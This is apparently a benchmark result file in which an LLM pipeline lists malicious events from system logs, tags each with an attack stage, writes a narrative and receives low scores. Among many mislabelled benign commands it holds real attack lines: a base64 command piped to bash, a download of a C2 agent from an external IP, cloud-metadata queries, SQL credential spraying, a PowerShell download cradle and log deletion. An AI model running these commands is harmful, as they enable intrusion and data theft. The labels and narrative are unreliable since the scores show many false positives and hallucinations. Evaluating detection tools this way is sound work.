@@ -1,0 +1,406 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "sh -c which ps",
+        "stage": "Discovery"
+      },
+      {
+        "command": "sh -c /usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=",
+        "stage": "Discovery"
+      },
+      {
+        "command": "sh -c \"(/root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/vs/base/node/cpuUsage.sh)\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "sh -c \"/root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/vs/base/node/cpuUsage.sh\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "sh -c \"/root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/vs/base/node/cpuUsage.sh\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "sh -c '/root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/vs/base/node/cpuUsage.sh'",
+        "stage": "Discovery"
+      },
+      {
+        "command": "sh -c \"('/root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/vs/base/node/cpuUsage.sh')\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "sh -c=\"/root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/vs/base/node/cpuUsage.sh\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "node /root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/bootstrap-fork --type=ptyHost",
+        "stage": "Execution"
+      },
+      {
+        "command": "sh -c \"wget --version > /dev/null;if [ $? -eq 0 ];then wget --connect-timeout=7 --tries=1 --dns-timeout=7 -q --header='Metadata:true' -O - http://169.254.169.254/metadata/instance?api-version=2019-03-11;else curl --version > /dev/null;if [ $? -eq 0 ]then curl --connect-timeout 7 -s --header='Metadata:true' http://169.254.169.254/metadata/instance?api-version=2019-03-11;fi;fi;exit 0\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "sh -c \"wget --version > /dev/null;if [ $? -eq 0 ];then wget --connect-timeout=7 --tries=1 --dns-timeout=7 -q  -O - http://169.254.169.254/latest/meta-data/instance-id;else curl --version > /dev/null;if [ $? -eq 0 ]then curl --connect-timeout 7 -s  http://169.254.169.254/latest/meta-data/instance-id;fi;fi;exit 0\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "bash -c echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "base64 -d",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "bash -c curl -O http://124.223.85.207:8079/sandcat-linux",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "curl -O http://124.223.85.207:8079/sandcat-linux",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "chmod +x sandcat-linux",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "sshd -D -R",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "bash -c del /f /usr/tomcat/apache-tomcat-8.5.76//webapps/ROOT/logout.txt",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "del /f /usr/tomcat/apache-tomcat-8.5.76//webapps/ROOT/logout.txt",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "bash -c del /f /q c:\\windows\\logout.jsp",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "del /f /q c:\\",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec whoami",
+        "stage": "Discovery"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec whoami",
+        "stage": "Discovery"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --exec whoami",
+        "stage": "Discovery"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --exec whoami",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -Command \"$ip='https://124.224.85.207:8443';[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$url=$ip+'/file/download';$wc=New-Object System.Net.WebClient;$wc.Headers.add('company_code',1234567);>$output=\"C:\\",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -WindowStyle Hidden -Command &$null;",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "sh -c rm ./sqltool_amd64_upx ; rm /tmp/sandcat-linux -r ; rm #{collection.path.name}/webapps/ROOT/logout.jsp -r",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "rm ./sqltool_amd64_upx",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "rm /tmp/sandcat-linux -r",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "echo powerup.",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "echo find /var/lib/dpkg/info/*.list | xargs grep -i apache",
+        "stage": "Discovery"
+      },
+      {
+        "command": "echo dpkg-query -l | grep tomcat",
+        "stage": "Discovery"
+      },
+      {
+        "command": "echo [ ! -z ${EXECUTABLE} ] || { EXECUTABLE=/usr/sbin/service; } ; $EXECUTABLE status apache2",
+        "stage": "Discovery"
+      },
+      {
+        "command": "echo [ -n '${EXECUTABLE}' ] && ${EXECUTABLE} restart apache2",
+        "stage": "Execution"
+      },
+      {
+        "command": "echo [ ! -z ${EXECUTABLE} ] || { EXECUTABLE=/usr/sbin/service; } ; $EXECUTABLE stop apache2",
+        "stage": "Execution"
+      },
+      {
+        "command": "sh -c '/root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/vs/base/node/cpuUsage.sh'",
+        "stage": "Discovery"
+      },
+      {
+        "command": "sh -c ls -l /proc/[0-9]*/fd/[0-9]* | grep socket:",
+        "stage": "Discovery"
+      },
+      {
+        "command": "ls -l /proc/[0-9]*/fd/[0-9]* | grep socket:",
+        "stage": "Discovery"
+      },
+      {
+        "command": "test -x /etc/cron.daily/popularity-contest && /etc/cron.daily/popularity-contest --crond",
+        "stage": "Persistence"
+      },
+      {
+        "command": "popularity-cont /etc/cron.daily/popularity-contest --crond",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "sh -c which git",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "git clone https://github.com/MicrosoftDocs/msft-docs-tools.git",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "unpack /tmp/urandom.zip",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "/home/user/.local/bin/git add unpack.tar.gz",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "/home/user/.local/bin/git commit -am \"<a new message>\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "bash -c find /var/lib/dpkg/info/*.list | xargs grep -i apache",
+        "stage": "Discovery"
+      },
+      {
+        "command": "find /var/lib/dpkg/info/*.list | xargs grep -i apache",
+        "stage": "Discovery"
+      },
+      {
+        "command": "bash -c dpkg-query -l | grep tomcat",
+        "stage": "Discovery"
+      },
+      {
+        "command": "dpkg-query -l | grep tomcat",
+        "stage": "Discovery"
+      },
+      {
+        "command": "bash -c `[ ! -z \\${EXECUTABLE} ] || { EXECUTABLE=/usr/sbin/service; } ; $EXECUTABLE status apache2`",
+        "stage": "Discovery"
+      },
+      {
+        "command": "`[ ! -z \\${EXECUTABLE} ] || { EXECUTABLE=/usr/sbin/service; } ; $EXECUTABLE status apache2`",
+        "stage": "Discovery"
+      },
+      {
+        "command": "bash -c `[ -n '\\${EXECUTABLE}' ] && ${EXECUTABLE} restart apache2`",
+        "stage": "Execution"
+      },
+      {
+        "command": "`[ -n '\\${EXECUTABLE}' ] && ${EXECUTABLE} restart apache2`",
+        "stage": "Execution"
+      },
+      {
+        "command": "bash -c `[ ! -z \\${EXECUTABLE} ] || { EXECUTABLE=/usr/sbin/service; } ; $EXECUTABLE stop apache2`",
+        "stage": "Execution"
+      },
+      {
+        "command": "`[ ! -z \\${EXECUTABLE} ] || { EXECUTABLE=/usr/sbin/service; } ; $EXECUTABLE stop apache2`",
+        "stage": "Execution"
+      },
+      {
+        "command": "bash -c `cat /root/.vscode-server/.ccbaa2d27e38e5afa3e5c21c1c7bef4657064247.log`",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cat /root/.vscode-server/.ccbaa2d27e38e5afa3e5c21c1c7bef4657064247.log",
+        "stage": "Discovery"
+      },
+      {
+        "command": "ls /root/.vscode-server/bin 2>/dev/null || echo ''",
+        "stage": "Discovery"
+      },
+      {
+        "command": "bash -c `/bin/dd if=/dev/random bs=16 count=1 2>/dev/null | xxd -r -p | dd of=/tmp/eapmdks`",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "/bin/dd if=/dev/random bs=16 count=1 2>/dev/null | xxd -r -p | dd of=/tmp/eapmdks",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "echo 01-ifupdown -e /etc/NetworkManager/dispatcher.d/01-ifupdown eth0 dhcp4-change > /dev/null",
+        "stage": "Execution"
+      },
+      {
+        "command": "01-ifupdown -e /etc/NetworkManager/dispatcher.d/01-ifupdown eth0 dhcp4-change",
+        "stage": "Execution"
+      },
+      {
+        "command": "echo 20-chrony /etc/NetworkManager/dispatcher.d/20-chrony eth0 dhcp4-change",
+        "stage": "Execution"
+      },
+      {
+        "command": "20-chrony /etc/NetworkManager/dispatcher.d/20-chrony eth0 dhcp4-change",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "apt-helper wait-online",
+        "stage": "Persistence"
+      },
+      {
+        "command": "systemctl is-active -q systemd-networkd.service",
+        "stage": "Discovery"
+      },
+      {
+        "command": "systemctl is-active -q NetworkManager.service",
+        "stage": "Discovery"
+      },
+      {
+        "command": "nm-online -q --timeout 30",
+        "stage": "Discovery"
+      },
+      {
+        "command": "systemctl is-active -q connman.service",
+        "stage": "Discovery"
+      },
+      {
+        "command": "apt.systemd.dai /usr/lib/apt/apt.systemd.daily update",
+        "stage": "Execution"
+      },
+      {
+        "command": "flock -w 3600 3",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "apt.systemd.dai /usr/lib/apt/apt.systemd.daily lock_is_held update",
+        "stage": "Execution"
+      },
+      {
+        "command": "cmp -s apt.extended_states.0 /var/lib/apt/extended_states",
+        "stage": "Discovery"
+      },
+      {
+        "command": "which /usr/bin/which apt-config",
+        "stage": "Discovery"
+      },
+      {
+        "command": "apt-config shell AutoAptEnable APT::Periodic::Enable",
+        "stage": "Discovery"
+      },
+      {
+        "command": "which /usr/bin/which apt-get",
+        "stage": "Discovery"
+      },
+      {
+        "command": "apt-get check -qq",
+        "stage": "Collection"
+      },
+      {
+        "command": "apt-get -qq -y update",
+        "stage": "Collection"
+      },
+      {
+        "command": "http",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "https",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "gpgv",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "gnupg",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "apt-key /usr/bin/apt-key --quiet --readonly verify --status-fd 3 /tmp/apt.sig.LRiljy /tmp/apt.data.aQzZGv",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "apt-key /usr/bin/apt-key --quiet --readonly verify --status-fd 3 /tmp/apt.sig.y3GXyZ /tmp/apt.data.mOCLZY",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "apt-key /usr/bin/apt-key --quiet --readonly verify --status-fd 3 /tmp/apt.sig.AYpKIt /tmp/apt.data.SUgCHt",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "apt-key /usr/bin/apt-key --quiet --readonly verify --status-fd 3 /tmp/apt.sig.dWuIM2 /tmp/apt.data.hzBqU4",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "apt-key /usr/bin/apt-key --quiet --readonly verify --status-fd 3 /tmp/apt.sig.lwS7Dw /tmp/apt.data.Q4cQau",
+        "stage": "Credential Access"
+      }
+    ],
+    "narrative": "The attacker started by using an unknown initial access vector to gain entry into the system. This was followed by discovery activities such as checking processes running on the system, checking CPU usage, and gathering information about the system configuration. The attacker also executed several PowerShell commands to gather information about the system and its configurations. Additionally, the attacker executed several Unix commands such as ls, grep, and cat to gather information about the system files and directories. In terms of privilege escalation, the attacker executed the powerup module to elevate their privileges. Furthermore, the attacker exploited vulnerabilities in Apache Tomcat to gain remote code execution capabilities. To maintain persistence, the attacker added a cron job to execute their malware periodically. Lastly, the attacker leveraged various tools such as Git, SSH, and NSIS to carry out their malicious activities.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 43141,
+      "completion_tokens": 6167,
+      "total_tokens": 49308,
+      "wall_clock_s": 79.738,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.07865168539325842,
+      "recall": 0.5833333333333334,
+      "f1": 0.13861386138613863,
+      "tp": 7,
+      "fp": 82,
+      "fn": 5
+    },
+    "stage": {
+      "precision": 0.011235955056179775,
+      "recall": 0.14285714285714285,
+      "f1": 0.020833333333333332,
+      "tp": 1,
+      "fp": 88,
+      "fn": 6,
+      "recall_partial": 0.21428571428571427
+    },
+    "hallucination_rate": 0.22727272727272727,
+    "cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 43141,
+      "completion_tokens": 6167,
+      "total_tokens": 49308,
+      "wall_clock_s": 79.738,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v2_maxtok4096",
+    "max_tokens": 4096,
+    "prompt_variant": "base",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
